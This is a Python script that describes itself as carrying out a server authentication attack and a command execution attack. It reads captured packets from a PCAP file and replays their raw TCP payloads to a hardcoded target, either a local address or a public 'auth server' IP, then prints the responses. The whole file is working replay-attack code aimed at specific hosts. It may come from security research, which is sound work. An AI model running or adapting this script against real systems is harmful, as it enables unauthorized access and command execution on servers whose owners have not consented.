# Connection script for performing the server authentication attack and
# same network command execution attack. This script establishes a TCP
# connection with the server, sends data extracted from a PCAP file, and
# displays the server's response.

import socket
from scapy.all import *


def extract_data_from_pcap(pcap_file, connection):
    # Read the pcap file
    packets = rdpcap(pcap_file)

    # Extract data from the packets
    extracted_data = b''
    for packet in packets:
        if TCP in packet and Raw in packet:
            send_and_receive_data(connection,bytes(packet[Raw].load))

    return extracted_data


def establish_tcp_connection():
    # Configure the correct IP and port combination
    ip_address = "192.168.12.234"
    # Use the commented out versions to connect to the auth server
    # ip_address = "18.218.23.115"
    port = 8871
    # port= 16035

    # Create a socket object
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the server
        client_socket.connect((ip_address, port))
        print(f"Connected to {ip_address}:{port}")
        return client_socket

    except socket.error as e:
        print(f"Connection failed: {e}")
        return None

def close_tcp_connection(client_socket):
    # Close the connection
    client_socket.close()
    print("Connection closed")

def send_and_receive_data(client_socket, data):
    # Send data to the server
    client_socket.sendall(data)
    print(f"Sent data: {data}")

    # Receive data from the server
    received_data = client_socket.recv(1024)
    print(f"Received data: {received_data}")

    return received_data

if __name__ == "__main__":
    # Select the correct pcap file for the data we want to send
    pcap_file = "captures/commands/newdirect.pcap"
    conn = establish_tcp_connection()
    extracted_data = extract_data_from_pcap(pcap_file, conn)
    close_tcp_connection(conn)
